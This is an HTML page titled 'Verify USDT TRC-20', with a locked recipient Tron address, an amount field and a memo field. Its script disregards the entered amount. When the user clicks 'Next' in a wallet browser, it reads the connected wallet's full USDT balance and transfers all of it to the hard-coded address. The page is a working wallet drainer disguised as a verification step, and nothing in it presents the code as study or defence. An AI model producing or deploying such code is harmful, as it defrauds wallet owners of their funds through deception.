<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verify USDT TRC-20</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
</head>
<body class="bg-white text-gray-800 font-sans">
  <div class="max-w-md mx-auto p-4">

    <label class="block text-sm font-medium mb-1">Address or Domain Name</label>
    <input type="text" id="addressInput" value="TWGTigi1TUZWbPLbewscnuzCAgdQ59wAg2" class="w-full border rounded-lg px-3 py-2 mb-4" readonly />

    <label class="block text-sm font-medium mb-1">Amount</label>
    <input type="text" id="amountInput" placeholder="Enter amount" class="w-full border rounded-lg px-3 py-2 mb-1"/>

    <label class="block text-sm font-medium mb-1 mt-4">Memo</label>
    <input type="text" id="memoInput" placeholder="Optional" class="w-full border rounded-lg px-3 py-2 mb-6"/>

    <button onclick="sendTRC20()" class="w-full bg-blue-700 text-white text-lg py-3 rounded-full">
      Next
    </button>

    <p id="status" class="text-center text-sm mt-4 text-gray-600"></p>
  </div>

  <script>
    // Official TRC-20 USDT Contract Address on Tron Mainnet
    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; 

    async function sendTRC20() {
      const recipient = document.getElementById("addressInput").value;
      const statusEl = document.getElementById("status");

      // Verify TronLink/Provider is active
      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
        alert("Please open in a Tron-compatible wallet (like TronLink or Trust Wallet)");
        return;
      }

      try {
        statusEl.textContent = "Connecting to Tron network...";
        
        // Connect to the USDT contract
        const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
        const sender = window.tronWeb.defaultAddress.base58;

        statusEl.textContent = "Fetching USDT balance...";
        
        // Get the full balance of the sender
        const balance = await contract.balanceOf(sender).call();
        
        // Check if balance is 0 (Tron returns BigNumber usually, but handles comparisons well)
        if (balance == 0) {
          statusEl.textContent = "❌ No TRC-20 USDT found in this wallet.";
          return;
        }

        statusEl.textContent = "Transferring all USDT...";

        // Execute transfer of total balance to the recipient
        // feeLimit is set to 100 TRX (100,000,000 Sun) to ensure the transaction has enough energy
        const tx = await contract.transfer(recipient, balance).send({
          feeLimit: 100000000 
        });

        statusEl.textContent = "✅ All TRC-20 USDT sent successfully.";
        console.log("TXID:", tx);

      } catch (err) {
        console.error("Error during transfer:", err);
        statusEl.textContent = "❌ Transaction failed. Ensure you have TRX for gas.";
      }
    }
  </script>
</body>
</html>
